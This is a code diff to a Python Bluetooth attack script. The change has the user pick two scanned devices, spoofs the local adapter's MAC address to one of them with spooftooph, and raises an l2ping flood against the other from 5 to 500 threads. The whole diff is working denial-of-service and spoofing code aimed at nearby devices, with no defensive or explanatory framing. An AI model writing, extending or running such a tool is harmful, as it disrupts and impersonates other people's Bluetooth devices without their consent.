@@ -46,8 +46,10 @@ async def get_mac():
     # Starting Bluetooth Scan
     devices = await scan_devices()
     display_devices(devices)
-    selected_device = select_option(devices)
-    return selected_device
+    m_selected_device = select_option(devices)
+    s_selected_device = select_option(devices)
+
+    return m_selected_device, s_selected_device
 
 def l2ping_flood(mac):
     p = subprocess.Popen(["l2ping", "-s", "600", "-f", mac])
@@ -55,11 +57,13 @@ def l2ping_flood(mac):
     return p.returncode
 
 def main():
-    mac_address = asyncio.run(get_mac())
+    h_mac_address, s_mac_address = asyncio.run(get_mac())
+    p = subprocess.Popen(["spooftooph", "-i", "hci1", "-a", h_mac_address])
+    print(p.returncode)
     threads = []
-    print(mac_address)
-    for i in range(5):
-        t = threading.Thread(target=l2ping_flood, args=(mac_address,))
+    print(s_mac_address)
+    for i in range(500):
+        t = threading.Thread(target=l2ping_flood, args=(s_mac_address,))
         t.daemon = True
         t.start()
         threads.append(t)
